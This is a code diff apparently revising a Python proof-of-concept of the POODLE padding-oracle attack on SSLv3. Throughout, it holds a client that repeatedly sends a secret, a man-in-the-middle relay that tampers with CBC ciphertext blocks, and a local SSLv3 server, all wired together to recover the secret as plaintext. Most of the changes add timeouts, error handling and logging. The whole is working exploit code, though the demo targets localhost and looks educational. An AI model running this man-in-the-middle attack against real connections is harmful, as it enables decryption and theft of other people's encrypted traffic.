@@ -8,7 +8,7 @@
     Example of a failure, when client doesn't support SSLv3 (unsupported protocol):
     openssl s_client -connect localhost:30001
     CONNECTED(00000003)
-    140277832255232:error:14171102:SSL routines:tls_process_server_hello:unsupported protocol:ssl/statem/statem_clnt.c:917:
+    error:14171102:SSL routines:tls_process_server_hello:unsupported protocol:ssl/statem/statem_clnt.c:917:
 """
 
 import sys
@@ -116,8 +116,8 @@ class PoodleClient(POODLE):
         output = '%s|secret=%s|%s' % (prefix, self.secret_to_use, suffix)
         self.send_bytes = bytearray(output, 'ASCII')
         if really_verbose_debugging:
-            print("XXX trigger('%s', '%s'), output: %s, bytes: %s" %
-                  (prefix, suffix, output, binascii.hexlify(self.send_bytes)))
+            log.debug("PoodleProtocol::trigger('%s', '%s'), output: %s, bytes: %s" %
+                      (prefix, suffix, output, binascii.hexlify(self.send_bytes)))
 
         # Block here until sending is complete.
         # While looping, run also MITM and server.
@@ -128,28 +128,37 @@ class PoodleClient(POODLE):
         coro = self.loop.create_connection(lambda: PoodleClient.PoodleProtocol(self, received_data_future),
                                            self.server_info[0], self.server_info[1],
                                            ssl=ssl_context)
-        ssl, proto = self.loop.run_until_complete(coro)
 
-        # PoodleClient has made a connection and sent a request at this point.
-        # Since we really don't care about the response, we could just stop here.
-        # But we do block here until the entire stack is done its chores.
+        ssl_socket = None
         try:
-            self.loop.run_until_complete(received_data_future)
-        except RuntimeError:
-            if really_verbose_debugging:
-                print("darn!")
+            ssl_socket, proto = self.loop.run_until_complete(coro)
+        except (ConnectionResetError, ConnectionRefusedError, ConnectionAbortedError):
+            log.error("trigger() Failed to connect!")
+            received_data_future.cancel()
+        else:
+            # PoodleClient has made a connection and sent a request at this point.
+            # Since we really don't care about the response, we could just stop here.
+            # But we do block here until the entire stack is done its chores.
+            try:
+                self.loop.run_until_complete(received_data_future)
+            except RuntimeError as e:
+                if really_verbose_debugging:
+                    print("trigger() darn! %s" % e)
+            except asyncio.TimeoutError as e:
+                log.error("trigger() TimeoutError ARGH! Error: %s" % e)
 
         # PoodleClient is done at this point.
         # If there are any pending tasks for the servers, wait until they're done.
         pending = asyncio.Task.all_tasks()
-        self.loop.run_until_complete(asyncio.gather(*pending))
+        self.loop.run_until_complete(asyncio.gather(*pending, loop=self.loop, return_exceptions=True))
 
         # Make sure the SSL-socket is really closed
-        ssl.close()
+        if ssl_socket:
+            ssl_socket.close()
 
         if not self.message:
-            print("FAIL! no message")
-            exit(1)
+            print("trigger() FAIL! no message")
+            return None
 
         if really_verbose_debugging:
             log.debug('PoodleClient::trigger() done')
@@ -180,7 +189,15 @@ class MitmTCPHandler(object):
             self.client_transport = None
             self.just_altered = None
 
+            self.client_connect_timeout = 5  # seconds
+            self.client_send_timeout = 5  # seconds
+
         def connection_made(self, transport):
+            """
+            Incoming connection to MITM server.
+            :param transport: async transport to talk to client connecting to us
+            :return: nothing
+            """
             self.transport = transport
             self.just_altered = False
             if really_verbose_debugging:
@@ -188,21 +205,42 @@ class MitmTCPHandler(object):
                 log.debug("MitmTCPHandler::MitmServerProtocol::connection_made() Connection from %s:%d" % (
                     peername[0], peername[1]))
 
+            # Any data received from client will need to be sent to real server.
+            # Note. The client has not sent any data yet, but in all likelihood it eventually will.
+            # Get an asyncio.Lock() to prevent this server from sending data to real server,
+            # until a connection has been established there.
             self.client_lock_coro = self.client_lock.acquire()
             asyncio.ensure_future(self.client_lock_coro).add_done_callback(self._got_client_lock)
 
         def _got_client_lock(self, task):
+            task.result() # True at this point, but call there will trigger any exceptions
             if really_verbose_debugging:
                 log.debug("MitmTCPHandler::MitmServerProtocol::_got_client_lock()")
+
             coro = self.loop.create_connection(lambda: MitmTCPHandler.MitmClientProtocol(self),
                                                self.connect_info[0], self.connect_info[1])
-            asyncio.ensure_future(coro).add_done_callback(self.connected_to_real_server)
+            asyncio.ensure_future(asyncio.wait_for(coro,
+                                                   self.client_connect_timeout, loop=self.loop
+                                                   )).add_done_callback(self.connected_to_real_server)
 
         def connected_to_real_server(self, task):
-            if really_verbose_debugging:
-                log.debug('MitmTCPHandler::MitmServerProtocol::connected_to_real_server()')
-            transport, client_object = task.result()
-            self.client_transport = transport
+            try:
+                transport, client_object = task.result()
+            except asyncio.TimeoutError:
+                log.error('MitmTCPHandler::MitmServerProtocol::connected_to_real_server() failed to connect. '
+                          'Exception: %s' % task.exception())
+                self.transport.close()
+                self.client_lock.release()
+                return
+
+            if self.transport.is_closing():
+                transport.close()
+                log.error('MitmTCPHandler::MitmServerProtocol::connected_to_real_server(), but server connection '
+                          'is gone! Closing this new connection too.')
+            else:
+                self.client_transport = transport
+                if really_verbose_debugging:
+                    log.debug('MitmTCPHandler::MitmServerProtocol::connected_to_real_server()')
             self.client_lock.release()
 
         def data_received(self, data_in):
@@ -210,11 +248,11 @@ class MitmTCPHandler(object):
             Handle data received from SSLv3 client.
             Relay it to real server. Altered, or unaltered.
 
-            Typical SSLv3 content types are:
+            Info: Typical SSLv3 content types are:
             0x16 / 22 : Handshake: Client hello, Server hello, certificate
             0x17 / 23 : Application data
             0x15 / 21 : Alert
-            :param data: the bytes received
+            :param data_in: the bytes received
             :return: None
             """
 
@@ -225,8 +263,10 @@ class MitmTCPHandler(object):
             (content_type, version_major, version_minor, length) = struct.unpack('>BBBH', header)
             if really_verbose_debugging:
                 peername = self.transport.get_extra_info('peername')
-                log.debug("MitmServerProtocol::data_received() from %s:%d, SSL content type: %s, Ver: %d.%d, Len: %d" %
-                          (peername[0], peername[1], content_type, version_major, version_minor, length))
+                log.debug(
+                    "MitmTCPHandler::MitmServerProtocol::data_received() from %s:%d, SSL content type: %s, "
+                    "Ver: %d.%d, Len: %d" %
+                    (peername[0], peername[1], content_type, version_major, version_minor, length))
             if not (version_major == 3 and version_minor == 0):
                 raise RuntimeError("This is not SSLv3!")
             # SSLv3 spec, Content type 23 = application data
@@ -245,8 +285,8 @@ class MitmTCPHandler(object):
                     # To make it possible to send the data, assume that "header" is the unaltered part.
                     if really_verbose_debugging:
                         log.debug(
-                            "MitmServerProtocol::data_received(): last block header: %s is: (content_type %d, version %d.%d,"
-                            " length %d), has %s bytes of data" %
+                            "MitmServerProtocol::data_received(): last block header: %s is: "
+                            "(content_type %d, version %d.%d, length %d), has %s bytes of data" %
                             (binascii.hexlify(header), content_type, version_major, version_minor, length, len(data)))
                     header = data_in[:5 + block_pointer]
 
@@ -263,27 +303,50 @@ class MitmTCPHandler(object):
             if really_verbose_debugging:
                 log.debug('MitmTCPHandler::MitmServerProtocol::data_received() Sending to real server')
             message = header + data_out
-            asyncio.ensure_future(self.send_to_real_server(message))
+            asyncio.ensure_future(self.send_to_real_server(message, self.client_send_timeout))
 
-        def send_to_real_server(self, message, timeout=15):
+        def send_to_real_server(self, message, timeout=5.0):
             if really_verbose_debugging:
                 log.debug('MitmTCPHandler::MitmServerProtocol::send_to_real_server() sending')
             # We will yield (sorta block) unless can acquire client_lock. This lock will be made available after
             # successful connection to real SSL-server.
+            # In case the connection fails, lock will be acquired anyway, but client_transport won't be set.
             yield from self.client_lock.acquire()
-            self.client_transport.write(message)
-            self.client_lock.release()
+            if self.client_transport:
+                # Then wrap _send_to_real_server() with a timeout
+                asyncio.ensure_future(asyncio.wait_for(self._send_to_real_server(message),
+                                                       timeout, loop=self.loop)
+                                      ).add_done_callback(self.sent_to_real_server)
+            else:
+                log.error('MitmTCPHandler::MitmServerProtocol::send_to_real_server() failed to send, no transport')
+                self.client_lock.release()
+
+        @asyncio.coroutine
+        def _send_to_real_server(self, message):
             if really_verbose_debugging:
-                log.debug('MitmTCPHandler::MitmServerProtocol::send_to_real_server() sent')
+                log.debug('MitmTCPHandler::MitmServerProtocol::_send_to_real_server() sending')
+            self.client_transport.write(message)
+
+        def sent_to_real_server(self, task):
+            try:
+                # Just call result() to trigger any possible exception in the payload.
+                task.result()
+            except (TimeoutError, asyncio.TimeoutError):
+                task.cancel()
+                log.error('MitmTCPHandler::MitmServerProtocol::sent_to_real_server() failed to send, timeout')
+                if self.client_transport:
+                    self.client_transport.close()
+                self.transport.close()
+            else:
+                if really_verbose_debugging:
+                    log.debug('MitmTCPHandler::MitmServerProtocol::sent_to_real_server()')
+            self.client_lock.release()
 
         def connection_lost(self, exc):
             if really_verbose_debugging:
                 peername = self.transport.get_extra_info('peername')
                 log.debug('MitmTCPHandler::MitmServerProtocol::connection_lost() The client %s:%d closed the connection'
                           % (peername[0], peername[1]))
-
-        def close(self):
-            log.debug('MitmTCPHandler::MitmServerProtocol::close() Closing business')
 
     class MitmClientProtocol(asyncio.Protocol):
         def __init__(self, server):
@@ -326,14 +389,11 @@ class MitmTCPHandler(object):
             if really_verbose_debugging:
                 log.debug("MitmTCPHandler::MitmClientProtocol::data_received() Sending back to client.")
             self.server.transport.write(data)
-            # No need to close connection on client
-            # self.transport.close()
 
         def connection_lost(self, exc):
             if not self.server.just_altered:
                 log.debug('MitmTCPHandler::MitmClientProtocol::connection_lost() The server closed the connection'
                           ' and no altered data was transmitted.')
-                exit(1)
             else:
                 # We're hacking ... server doesn't love our requests.
                 if really_verbose_debugging:
@@ -371,14 +431,15 @@ class SecureTCPHandler(object):
             cipher_name, ssl_version, secret_bits = self.transport.get_extra_info('cipher')
             if 'CBC' not in cipher_name:
                 raise RuntimeError(
-                    "SSLServerProtocol: This doesn't make any sense! Using cipher %s, but it doesn't do CBC block cipher!")
+                    "SSLServerProtocol: This doesn't make any sense! "
+                    "Using cipher %s, but it doesn't do CBC block cipher!")
             if really_verbose_debugging:
                 peername = self.transport.get_extra_info('peername')
                 log.debug("SecureTCPHandler::SSLServerProtocol() Connection from %s:%d" % (peername[0], peername[1]))
 
         def data_received(self, data):
-            peername = self.transport.get_extra_info('peername')
             if really_verbose_debugging:
+                peername = self.transport.get_extra_info('peername')
                 log.debug("SecureTCPHandler::SSLServerProtocol::data_received() from %s:%d: %s" %
                           (peername[0], peername[1], data))
             # Ignore data, just reply ok.
@@ -453,6 +514,9 @@ def main():
 
     # Start
     with closing(asyncio.get_event_loop()) as loop:
+        # Debugging the internals of event loop:
+        #loop.set_debug(True)
+
         # Construct a PoodleClient. It knows about the POODLE-flaw and can transmit to given server.
         poodle = PoodleClient(loop, (mitm_host, mitm_port_to_listen), secret)
 
@@ -474,23 +538,19 @@ def main():
         plaintext = poodle.run()
 
         # If there are any pending tasks for the servers, wait until they're done.
-        pending = asyncio.Task.all_tasks()
-        loop.run_until_complete(asyncio.gather(*pending))
+        loop.run_until_complete(loop.shutdown_asyncgens())
 
         sslv3_server.server_socket.close()
         man_in_the_middle.server_socket.close()
-        loop.stop()
-        loop.close()
 
-        # Since there is no real way of knowing the actual length of original secret,
-        # the plaintext will very likely have extra characters at the end.
+        # A failure?
         if not plaintext:
             log.info("Done running poodle. Plaintext could not be recovered.")
-            return
-
-        log.info('Done running poodle. Plaintext is: "%s" (omit the possible garbage at the end), hex: %s' %
-                 (''.join(plaintext), binascii.hexlify(bytearray([ord(c[0]) for c in plaintext]))))
-
+        else:
+            # Since there is no real way of knowing the actual length of original secret,
+            # the plaintext will very likely have extra characters at the end.
+            log.info('Done running poodle. Plaintext is: "%s" (omit the possible garbage at the end), hex: %s' %
+                     (''.join(plaintext), binascii.hexlify(bytearray([ord(c[0]) for c in plaintext]))))
 
 if __name__ == "__main__":
     main()
